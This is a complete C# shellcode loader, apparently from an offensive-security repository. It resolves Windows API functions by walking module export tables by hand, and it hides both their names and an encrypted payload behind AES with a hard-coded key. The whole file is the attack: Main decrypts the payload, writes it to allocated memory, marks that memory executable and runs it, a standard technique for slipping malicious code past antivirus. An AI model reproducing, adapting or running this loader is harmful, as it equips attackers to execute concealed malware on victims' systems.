using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace CGPL
{
    internal class Program
    {

        //IMAGE_DOS_HEADER from pinvoke
        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DOS_HEADER
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
            public char[] e_magic;       // Magic number
            public UInt16 e_cblp;    // Bytes on last page of file
            public UInt16 e_cp;      // Pages in file
            public UInt16 e_crlc;    // Relocations
            public UInt16 e_cparhdr;     // Size of header in paragraphs
            public UInt16 e_minalloc;    // Minimum extra paragraphs needed
            public UInt16 e_maxalloc;    // Maximum extra paragraphs needed
            public UInt16 e_ss;      // Initial (relative) SS value
            public UInt16 e_sp;      // Initial SP value
            public UInt16 e_csum;    // Checksum
            public UInt16 e_ip;      // Initial IP value
            public UInt16 e_cs;      // Initial (relative) CS value
            public UInt16 e_lfarlc;      // File address of relocation table
            public UInt16 e_ovno;    // Overlay number
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
            public UInt16[] e_res1;    // Reserved words
            public UInt16 e_oemid;       // OEM identifier (for e_oeminfo)
            public UInt16 e_oeminfo;     // OEM information; e_oemid specific
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
            public UInt16[] e_res2;    // Reserved words
            public Int32 e_lfanew;      // File address of new exe header

            private string _e_magic
            {
                get { return new string(e_magic); }
            }

            public bool isValid
            {
                get { return _e_magic == "MZ"; }
            }
        }

        //IMAGE FILE HEADER from winsecurity github OffensiveC# repo
        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_FILE_HEADER
        {
            public UInt16 Machine;
            public UInt16 NumberOfSections;
            public UInt32 TimeDateStamp;
            public UInt32 PointerToSymbolTable;
            public UInt32 NumberOfSymbols;
            public UInt16 SizeOfOptionalHeader;
            public UInt16 Characteristics;
        }

        public enum MachineType : ushort
        {
            /// <summary>
            /// The content of this field is assumed to be applicable to any machine type
            /// </summary>
            Unknown = 0x0000,
            /// <summary>
            /// Intel 386 or later processors and compatible processors
            /// </summary>
            I386 = 0x014c,
            R3000 = 0x0162,
            /// <summary>
            ///  MIPS little endian
            /// </summary>
            R4000 = 0x0166,
            R10000 = 0x0168,
            /// <summary>
            /// MIPS little-endian WCE v2
            /// </summary>
            WCEMIPSV2 = 0x0169,
            /// <summary>
            /// Alpha AXP
            /// </summary>
            Alpha = 0x0184,
            /// <summary>
            /// Hitachi SH3
            /// </summary>
            SH3 = 0x01a2,
            /// <summary>
            /// Hitachi SH3 DSP
            /// </summary>
            SH3DSP = 0x01a3,
            /// <summary>
            /// Hitachi SH4
            /// </summary>
            SH4 = 0x01a6,
            /// <summary>
            /// Hitachi SH5
            /// </summary>
            SH5 = 0x01a8,
            /// <summary>
            /// ARM little endian
            /// </summary>
            ARM = 0x01c0,
            /// <summary>
            /// Thumb
            /// </summary>
            Thumb = 0x01c2,
            /// <summary>
            /// ARM Thumb-2 little endian
            /// </summary>
            ARMNT = 0x01c4,
            /// <summary>
            /// Matsushita AM33
            /// </summary>
            AM33 = 0x01d3,
            /// <summary>
            /// Power PC little endian
            /// </summary>
            PowerPC = 0x01f0,
            /// <summary>
            /// Power PC with floating point support
            /// </summary>
            PowerPCFP = 0x01f1,
            /// <summary>
            /// Intel Itanium processor family
            /// </summary>
            IA64 = 0x0200,
            /// <summary>
            /// MIPS16
            /// </summary>
            MIPS16 = 0x0266,
            /// <summary>
            /// Motorola 68000 series
            /// </summary>
            M68K = 0x0268,
            /// <summary>
            /// Alpha AXP 64-bit
            /// </summary>
            Alpha64 = 0x0284,
            /// <summary>
            /// MIPS with FPU
            /// </summary>
            MIPSFPU = 0x0366,
            /// <summary>
            /// MIPS16 with FPU
            /// </summary>
            MIPSFPU16 = 0x0466,
            /// <summary>
            /// EFI byte code
            /// </summary>
            EBC = 0x0ebc,
            /// <summary>
            /// RISC-V 32-bit address space
            /// </summary>
            RISCV32 = 0x5032,
            /// <summary>
            /// RISC-V 64-bit address space
            /// </summary>
            RISCV64 = 0x5064,
            /// <summary>
            /// RISC-V 128-bit address space
            /// </summary>
            RISCV128 = 0x5128,
            /// <summary>
            /// x64
            /// </summary>
            AMD64 = 0x8664,
            /// <summary>
            /// ARM64 little endian
            /// </summary>
            ARM64 = 0xaa64,
            /// <summary>
            /// LoongArch 32-bit processor family
            /// </summary>
            LoongArch32 = 0x6232,
            /// <summary>
            /// LoongArch 64-bit processor family
            /// </summary>
            LoongArch64 = 0x6264,
            /// <summary>
            /// Mitsubishi M32R little endian
            /// </summary>
            M32R = 0x9041
        }
        public enum MagicType : ushort
        {
            IMAGE_NT_OPTIONAL_HDR32_MAGIC = 0x10b,
            IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20b
        }
        public enum SubSystemType : ushort
        {
            IMAGE_SUBSYSTEM_UNKNOWN = 0,
            IMAGE_SUBSYSTEM_NATIVE = 1,
            IMAGE_SUBSYSTEM_WINDOWS_GUI = 2,
            IMAGE_SUBSYSTEM_WINDOWS_CUI = 3,
            IMAGE_SUBSYSTEM_POSIX_CUI = 7,
            IMAGE_SUBSYSTEM_WINDOWS_CE_GUI = 9,
            IMAGE_SUBSYSTEM_EFI_APPLICATION = 10,
            IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER = 11,
            IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER = 12,
            IMAGE_SUBSYSTEM_EFI_ROM = 13,
            IMAGE_SUBSYSTEM_XBOX = 14

        }
        public enum DllCharacteristicsType : ushort
        {
            RES_0 = 0x0001,
            RES_1 = 0x0002,
            RES_2 = 0x0004,
            RES_3 = 0x0008,
            IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE = 0x0040,
            IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY = 0x0080,
            IMAGE_DLL_CHARACTERISTICS_NX_COMPAT = 0x0100,
            IMAGE_DLLCHARACTERISTICS_NO_ISOLATION = 0x0200,
            IMAGE_DLLCHARACTERISTICS_NO_SEH = 0x0400,
            IMAGE_DLLCHARACTERISTICS_NO_BIND = 0x0800,
            RES_4 = 0x1000,
            IMAGE_DLLCHARACTERISTICS_WDM_DRIVER = 0x2000,
            IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE = 0x8000
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DATA_DIRECTORY
        {
            public UInt32 VirtualAddress;
            public UInt32 Size;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_OPTIONAL_HEADER64
        {
            [FieldOffset(0)]
            public MagicType Magic;

            [FieldOffset(2)]
            public byte MajorLinkerVersion;

            [FieldOffset(3)]
            public byte MinorLinkerVersion;

            [FieldOffset(4)]
            public uint SizeOfCode;

            [FieldOffset(8)]
            public uint SizeOfInitializedData;

            [FieldOffset(12)]
            public uint SizeOfUninitializedData;

            [FieldOffset(16)]
            public uint AddressOfEntryPoint;

            [FieldOffset(20)]
            public uint BaseOfCode;

            [FieldOffset(24)]
            public ulong ImageBase;

            [FieldOffset(32)]
            public uint SectionAlignment;

            [FieldOffset(36)]
            public uint FileAlignment;

            [FieldOffset(40)]
            public ushort MajorOperatingSystemVersion;

            [FieldOffset(42)]
            public ushort MinorOperatingSystemVersion;

            [FieldOffset(44)]
            public ushort MajorImageVersion;

            [FieldOffset(46)]
            public ushort MinorImageVersion;

            [FieldOffset(48)]
            public ushort MajorSubsystemVersion;

            [FieldOffset(50)]
            public ushort MinorSubsystemVersion;

            [FieldOffset(52)]
            public uint Win32VersionValue;

            [FieldOffset(56)]
            public uint SizeOfImage;

            [FieldOffset(60)]
            public uint SizeOfHeaders;

            [FieldOffset(64)]
            public uint CheckSum;

            [FieldOffset(68)]
            public SubSystemType Subsystem;

            [FieldOffset(70)]
            public DllCharacteristicsType DllCharacteristics;

            [FieldOffset(72)]
            public ulong SizeOfStackReserve;

            [FieldOffset(80)]
            public ulong SizeOfStackCommit;

            [FieldOffset(88)]
            public ulong SizeOfHeapReserve;

            [FieldOffset(96)]
            public ulong SizeOfHeapCommit;

            [FieldOffset(104)]
            public uint LoaderFlags;

            [FieldOffset(108)]
            public uint NumberOfRvaAndSizes;

            [FieldOffset(112)]
            public IMAGE_DATA_DIRECTORY ExportTable;

            [FieldOffset(120)]
            public IMAGE_DATA_DIRECTORY ImportTable;

            [FieldOffset(128)]
            public IMAGE_DATA_DIRECTORY ResourceTable;

            [FieldOffset(136)]
            public IMAGE_DATA_DIRECTORY ExceptionTable;

            [FieldOffset(144)]
            public IMAGE_DATA_DIRECTORY CertificateTable;

            [FieldOffset(152)]
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;

            [FieldOffset(160)]
            public IMAGE_DATA_DIRECTORY Debug;

            [FieldOffset(168)]
            public IMAGE_DATA_DIRECTORY Architecture;

            [FieldOffset(176)]
            public IMAGE_DATA_DIRECTORY GlobalPtr;

            [FieldOffset(184)]
            public IMAGE_DATA_DIRECTORY TLSTable;

            [FieldOffset(192)]
            public IMAGE_DATA_DIRECTORY LoadConfigTable;

            [FieldOffset(200)]
            public IMAGE_DATA_DIRECTORY BoundImport;

            [FieldOffset(208)]
            public IMAGE_DATA_DIRECTORY IAT;

            [FieldOffset(216)]
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;

            [FieldOffset(224)]
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;

            [FieldOffset(232)]
            public IMAGE_DATA_DIRECTORY Reserved;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_NT_HEADERS64
        {
            [FieldOffset(0)]
            public UInt32 Signature;

            [FieldOffset(4)]
            public IMAGE_FILE_HEADER FileHeader;

            [FieldOffset(24)]
            public IMAGE_OPTIONAL_HEADER64 OptionalHeader;

        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_EXPORT_DIRECTORY
        {
            public UInt32 Characteristics;
            public UInt32 TimeDateStamp;
            public UInt16 MajorVersion;
            public UInt16 MinorVersion;
            public UInt32 Name;
            public UInt32 Base;
            public UInt32 NumberOfFunctions;
            public UInt32 NumberOfNames;
            public UInt32 AddressOfFunctions;     // RVA from base of image
            public UInt32 AddressOfNames;     // RVA from base of image
            public UInt32 AddressOfNameOrdinals;  // RVA from base of image
        }

 

        [DllImport("Kernel32.dll")]
        public static extern IntPtr CreateToolhelp32Snapshot(
            UInt32 dwFlags,
            UInt32 th32ProcessID
            );


        [StructLayout(LayoutKind.Sequential, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        public struct MODULEENTRY32W
        {
            internal uint dwSize;
            internal uint th32ModuleID;
            internal uint th32ProcessID;
            internal uint GlblcntUsage;
            internal uint ProccntUsage;
            internal IntPtr modBaseAddr;
            internal uint modBaseSize;
            internal IntPtr hModule;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
            internal string szModule;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            internal string szExePath;
        }

        [DllImport("Kernel32.dll")]
        public static extern bool Module32FirstW(
            IntPtr hSnapshot,
            ref MODULEENTRY32W lpme
            );


        [DllImport("Kernel32.dll")]
        public static extern bool Module32NextW(
            IntPtr hSnapshot,
            ref MODULEENTRY32W lpme
            );


        public delegate IntPtr VirtualAllocHelp(
            IntPtr lpAddress,
            int dwSize,
            UInt32 flAllocationType,
            UInt32 flProtect
        );

        public delegate bool VirtualProtectHelp(
            IntPtr lpAddress,
            int dwSize, 
            UInt32 flNewProtect,
            out uint lpflOldProtect
         );

        public delegate void Execute();



        public static IntPtr GetHandleToModule(IntPtr snapshothandle, string module) {
                      
            
            MODULEENTRY32W me = new MODULEENTRY32W();
            me.dwSize = (UInt32)Marshal.SizeOf(typeof(MODULEENTRY32W));

            bool res = Module32FirstW(snapshothandle, ref me);
            if (!res)
            {
                return IntPtr.Zero;
            }

            while (Module32NextW(snapshothandle, ref me))
            {
                
                if (me.szModule.ToLower() == module.ToLower()) {

                    
                    return me.modBaseAddr;
                }
            }
            return IntPtr.Zero;
            
        }

        public static byte[] GetSha256(string value)
        {
            var data = Encoding.UTF8.GetBytes(value);
            var hashData = new SHA256Managed().ComputeHash(data);
            return hashData;

        }


        public static IntPtr CiaoGrandeRetrieve(string dllName, string functionNameToLookup) {


            IntPtr snapshothandle = CreateToolhelp32Snapshot(1 | 2 | 4 | 8, 0);
            IntPtr baseAddressDll = GetHandleToModule(snapshothandle, dllName);
            if (baseAddressDll == IntPtr.Zero)
            {
                Console.WriteLine("[-] Error while reading the Process Snapshot");
                return IntPtr.Zero;
            }
            IMAGE_DOS_HEADER DosHeaderDLL = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(baseAddressDll, typeof(IMAGE_DOS_HEADER));
            IMAGE_NT_HEADERS64 NtHeadersDLL = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure(baseAddressDll + DosHeaderDLL.e_lfanew, typeof(IMAGE_NT_HEADERS64));
            IMAGE_OPTIONAL_HEADER64 OptHeaderDll = NtHeadersDLL.OptionalHeader;

            IntPtr exportTablePtr = baseAddressDll + (int)OptHeaderDll.ExportTable.VirtualAddress;
            IMAGE_EXPORT_DIRECTORY exportTable = (IMAGE_EXPORT_DIRECTORY)Marshal.PtrToStructure(exportTablePtr, typeof(IMAGE_EXPORT_DIRECTORY));

            IntPtr PtrAddressOfFunction = baseAddressDll + (int)exportTable.AddressOfFunctions;
            IntPtr PtrAddressOfNames = baseAddressDll + (int)exportTable.AddressOfNames;
           
            int NumberOfFunctions = Convert.ToInt32((exportTable.NumberOfNames.ToString("X")), 16);
  
            for (int i = 0; i < NumberOfFunctions; i++)
            {
                UInt32 PtrToName = (UInt32)Marshal.ReadInt32(PtrAddressOfNames, (i * sizeof(UInt32)));
                String FunctionName = Marshal.PtrToStringAnsi(baseAddressDll + (int)PtrToName);
              
                if (string.Compare(functionNameToLookup, FunctionName) == 0)
                {
                    
                    UInt32 PtrToFunction = (UInt32)Marshal.ReadInt32(PtrAddressOfFunction, (i * sizeof(UInt32)));
                    if ((PtrToFunction + (long)baseAddressDll) >= (long)exportTablePtr && PtrToFunction < ((long)exportTablePtr + OptHeaderDll.ExportTable.Size))

                    {
                       
                        String Forwarder = Marshal.PtrToStringAnsi(baseAddressDll + (int)PtrToFunction);
                        string dllNameToLookupF = Forwarder.Split('.')[0] + ".dll";
                        string functionNameToLookupF = Forwarder.Split('.')[1];
                        CiaoGrandeRetrieve(dllNameToLookupF, functionNameToLookupF);
                    }
                    
                    return (baseAddressDll + (int)PtrToFunction);
            
                }

            }
            return IntPtr.Zero;
        }

       
        static void Main(string[] args)
        {
            string key = "CiaoGrande";
            byte[] keyAes = GetSha256(key);

 
            string ciaogrande = "V+EgIUykV3QYsX5iDHsUKpRrsS+EiIkIiAcW4FkD+E6KvjcvUAq4z1hsfdH6Ga/KZZSpZv+LOBj4WsC/Pn/q0+RCoNCzt43EvqhYhjyu6ZBx82bfXNwP3C/l3kw9QAPWUEC177JmbRIU1V0///DbyBURxp3HkhFETCF1TPIpHBAX/Nv0m6alLhYLyzJOKhSzzj++giMndQRt20B2uXojD4SCS5eAG3WK8zNyujgKlPPMNHNZJaH0+s6YOOu92dmxPJWK9vVazDiFb7JxpjC9lKJjLVMjDur4bTS2k979XAuWIZmv+KTYjo4P8atK33HRoQSW/w5CQow+ZckrL6DFEY8HkONhx/1hRV6qEc8LfMK9SXG3KIEcyjmbavuerRidAQAKIgm1rIdimLkYrwMSappwkMkwtzYq2RP3pEwplEUWeh3FR8uR9kDWZ2xPdlsFeOL1BcEKunTKu+rjSWg7aO5GvFXx08MWIE7u2AMu2s/RZZBmnqAxVIj/+oQF9tfI";
            byte[] buf = Convert.FromBase64String(AesOperation.DecryptString(keyAes,ciaogrande));
            int bufSize = buf.Length;
            uint oldprotect = 0;
            IntPtr VirtualAllocPtr = CiaoGrandeRetrieve(AesOperation.DecryptString(keyAes, "pd6O/2VjBB0VTrEjz216gw=="), AesOperation.DecryptString(keyAes, "pYGzDGbPbfEg8fUiOr9A0Q=="));
            IntPtr VirtualProtectPtr = CiaoGrandeRetrieve(AesOperation.DecryptString(keyAes, "pd6O/2VjBB0VTrEjz216gw=="), AesOperation.DecryptString(keyAes, "PztaoByxxEseqHUz8uJOJg=="));
            
            if (VirtualAllocPtr == IntPtr.Zero || VirtualProtectPtr == IntPtr.Zero) {

                Console.WriteLine("[-] Error retrieving function address");
                return;
            }

            VirtualAllocHelp va = (VirtualAllocHelp)Marshal.GetDelegateForFunctionPointer(VirtualAllocPtr, typeof(VirtualAllocHelp));
            VirtualProtectHelp vp = (VirtualProtectHelp)Marshal.GetDelegateForFunctionPointer(VirtualProtectPtr, typeof(VirtualProtectHelp));
            
            IntPtr allocatedBufCG = va(IntPtr.Zero, bufSize, 0x00001000, 0x04);
            Marshal.Copy(buf, 0, allocatedBufCG, bufSize);
            vp(allocatedBufCG, bufSize, 0x20, out oldprotect); 
           
            Execute e = (Execute)Marshal.GetDelegateForFunctionPointer(allocatedBufCG, typeof(Execute));
            e();
        }
    }
}
